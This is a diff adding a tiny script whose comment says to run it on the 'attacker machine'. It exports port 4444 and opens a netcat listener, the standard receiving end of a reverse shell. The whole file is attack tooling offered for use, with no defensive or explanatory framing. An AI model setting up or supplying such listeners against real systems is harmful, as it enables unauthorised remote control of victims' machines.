@@ -1,0 +1,4 @@
+# RUN THIS ON ATTACKER MACHINE
+
+export PORT=4444
+nc -lvnp $PORT
